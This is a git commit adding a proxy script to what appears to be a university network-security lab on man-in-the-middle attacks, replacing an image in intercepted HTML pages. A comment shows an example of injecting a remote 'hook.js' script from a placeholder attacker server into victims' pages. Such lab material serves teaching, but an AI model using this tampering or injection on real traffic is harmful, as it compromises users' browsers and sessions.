009a6095161de0a0884aa0060feac22d084cac70
vitome @ kathara <angelo.spognardi@gmail.com>
2021-02-10 01:21:55 +0100

    a1 with unzip

---
+++ lab3/ex2/a1/custom-http-proxy.js
@@ -0,0 +1,20 @@
+// called when the script is loaded
+function onLoad() {
+}
+
+// called when the request is received by the proxy
+function onRequest() {
+}
+
+// called when the request is sent to the real server and a response is received
+// in this case: replace the cute kitten image in the response of /kittens.html
+function onResponse(req, res) {
+	if(res.ContentType.indexOf('text/html') == 0) {
+		var body = res.ReadBody();
+		res.Body = body.replace("img src=\"kittens.jpg\" ", "img src=\"jollypwn.png\" ");
+		log("kittens pwned");
+		// example: inject a malicious javascript
+		// body.replace('</head>','<script type="text/javascript" src="http://<server>:3000/hook.js"></script></head>')
+	}
+}
+
